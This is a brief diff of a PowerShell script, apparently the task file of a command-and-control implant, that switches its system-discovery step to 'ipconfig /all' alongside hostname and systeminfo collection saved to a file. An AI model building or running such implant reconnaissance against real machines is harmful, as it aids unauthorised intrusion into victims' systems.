@@ -4,7 +4,7 @@ Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\
 
 # Task 1: Gather system information
 $hostname = (hostname)
-$ipconfig = (ipconfig | Out-String)
+$ipconfig = (ipconfig /all | Out-String)
 $systeminfo = (systeminfo | Out-String)
 
 # Combine information into one variable and save it to a file
